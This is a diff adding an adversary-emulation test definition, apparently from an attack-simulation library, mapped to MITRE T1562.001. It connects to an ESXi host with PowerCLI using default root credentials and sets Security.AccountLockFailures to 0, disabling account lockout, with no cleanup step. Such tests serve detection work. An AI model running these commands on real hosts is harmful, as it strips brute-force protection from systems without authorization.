@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: ESXi - Disable Account Lockout Policy via PowerCLI
+description: |
+    An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.
+args:
+    - name: vm_host
+      type: string
+      default: atomic.local
+    - name: vm_user
+      type: string
+      default: root
+    - name: vm_pass
+      type: string
+      default: pass
+uuid: 091a6290-cd29-41cb-81ea-b12f133c66cb
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.001: Disable or Modify Tools'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: |
+        Check if VMWARE PowerCLI PowerShell Module is installed.
+      inline: |
+        $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
+        if (-not $RequiredModule) {{Install-Module -Name VMware.PowerCLI -Confirm:$false
+        }}
+      executor: powershell
+    - name: esxi---disable-account-lockout-policy-via-powercli
+      inline: "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server {{.Args.vm_host}} -User {{.Args.vm_user}} -Password {{.Args.vm_pass}}\nGet-AdvancedSetting -Entity {{.Args.vm_host}} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
